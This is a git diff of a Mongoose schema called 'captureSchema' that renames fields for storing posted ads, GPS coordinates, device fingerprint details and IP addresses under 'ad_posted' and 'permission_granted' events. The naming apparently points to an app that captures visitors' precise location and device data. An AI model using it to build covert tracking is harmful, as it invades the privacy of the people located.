@@ -20,8 +20,8 @@ const captureSchema = new mongoose.Schema({
     id: { type: Number, required: true, unique: true },
     type: { type: String, enum: ['ad_posted', 'permission_granted'], required: true },
     timestamp: { type: Date, default: Date.now },
-    ad: { title: String, category: String, description: String, price: String, location: String, phone: String },
-    location: { lat: Number, lng: Number, accuracy: Number, street: String, city: String, state: String, country: String, postcode: String, fullAddress: String },
+    ad: { title: String, category: String, description: String, price: String, streetAddress: String, cityArea: String, phone: String },
+    gpsLocation: { lat: Number, lng: Number, accuracy: Number, city: String, state: String, country: String, postcode: String },
     device: { userAgent: String, platform: String, language: String, screen: String, timezone: String, ip: String },
     ip: String
 }, { timestamps: true });
